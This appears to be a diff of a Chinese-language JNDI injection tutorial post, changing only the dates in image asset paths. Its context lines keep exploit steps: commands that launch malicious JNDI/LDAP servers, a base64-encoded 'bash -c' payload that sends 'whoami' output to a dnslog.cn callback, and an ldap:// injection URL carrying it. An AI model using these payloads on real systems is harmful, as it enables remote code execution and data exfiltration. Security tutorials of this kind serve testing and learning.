@@ -85,7 +85,7 @@ your-ip = 服务器的ip 而不是 docker 的ip
 那么就是访问: http://192.168.24.129:8090
 ```
 
-![pasted image 20260703173421](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173421.png)
+![pasted image 20260703173421](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173421.png)
 
 
 
@@ -117,9 +117,9 @@ Content-Length: 258
 }
 ```
 
-![pasted image 20260703173428](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173428.png)
+![pasted image 20260703173428](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173428.png)
 
-![pasted image 20260703173438](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173438.png)
+![pasted image 20260703173438](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173438.png)
 
 ## 0x04 整体环境说明
 
@@ -170,7 +170,7 @@ Content-Length: 255
 }
 ```
 
-![pasted image 20260703173433](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173433.png)
+![pasted image 20260703173433](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173433.png)
 
 ## 0x06 JNDI注入(少用)
 
@@ -192,7 +192,7 @@ JDK增加了com.sun.jndi.ldap.object.trustURLCodebase选项,默认为false
 命令: java -jar JNDI-1.0-all.jar
 ```
 
-![pasted image 20260703173448](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173448.png)
+![pasted image 20260703173448](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173448.png)
 
 
 
@@ -208,7 +208,7 @@ Base64编码: cGluZyBgd2hvYW1pYC4wcHM1M2QuZG5zbG9nLmNu
 最终command参数填写: bash -c {echo,cGluZyBgd2hvYW1pYC4wcHM1M2QuZG5zbG9nLmNu}|{base64,-d}|{bash,-i}
 ```
 
-![pasted image 20260703173453](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173453.png)
+![pasted image 20260703173453](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173453.png)
 
 
 
@@ -242,11 +242,11 @@ Content-Length: 264
 
 ```
 
-![pasted image 20260703173533](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173533.png)
+![pasted image 20260703173533](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173533.png)
 
-![pasted image 20260703173457](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173457.png)
+![pasted image 20260703173457](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173457.png)
 
-![pasted image 20260703173459](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173459.png)
+![pasted image 20260703173459](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173459.png)
 
 ## 0x07 JNDI高版本JDK反序列化绕过(常用)
 ## 0x07.1 JNDIInject-[version]-SNAPSHOT.jar - 基本使用
@@ -257,7 +257,7 @@ Content-Length: 264
 命令: java -jar JNDIInject-1.2-SNAPSHOT.jar -i 192.168.24.1 -u
 ```
 
-![pasted image 20260703173539](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173539.png)
+![pasted image 20260703173539](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173539.png)
 
 ## 0x07.2 JNDIInject-[version]-SNAPSHOT.jar - 项目启动
 
@@ -268,7 +268,7 @@ Content-Length: 264
 命令: java -jar JNDIInject-1.2-SNAPSHOT.jar -i 192.168.24.1
 ```
 
-![pasted image 20260703173544](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173544.png)
+![pasted image 20260703173544](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173544.png)
 
 ## 0x07.3 通过dnslog获取反序列化链
 
@@ -277,7 +277,7 @@ Content-Length: 264
 这样就会自动去爆破链了
 ```
 
-![pasted image 20260703173550](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173550.png)
+![pasted image 20260703173550](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173550.png)
 
 
 
@@ -308,11 +308,11 @@ Content-Length: 286
 }
 ```
 
-![pasted image 20260703173509](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173509.png)
+![pasted image 20260703173509](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173509.png)
 
-![pasted image 20260703173512](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173512.png)
+![pasted image 20260703173512](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173512.png)
 
-![pasted image 20260703173514](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173514.png)
+![pasted image 20260703173514](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173514.png)
 
 ## 0x07.4 反序列化链攻击测试
 
@@ -325,7 +325,7 @@ Base64编码: cGluZyBgd2hvYW1pYC5yd2c3MmguZG5zbG9nLmNu
 最终输入: ldap://192.168.24.1:1389/EL/base64/cGluZyBgd2hvYW1pYC5yd2c3MmguZG5zbG9nLmNu
 ```
 
-![pasted image 20260703173517](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173517.png)
+![pasted image 20260703173517](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173517.png)
 
 
 
@@ -356,11 +356,11 @@ Content-Length: 306
 }
 ```
 
-![pasted image 20260703173521](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173521.png)
+![pasted image 20260703173521](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173521.png)
 
-![pasted image 20260703173524](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173524.png)
+![pasted image 20260703173524](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173524.png)
 
-![pasted image 20260703173526](/assets/img/posts/2026-09-22-jndi-injection-attack/pasted-image-20260703173526.png)
+![pasted image 20260703173526](/assets/img/posts/2026-03-22-jndi-injection-attack/pasted-image-20260703173526.png)
 
 
 
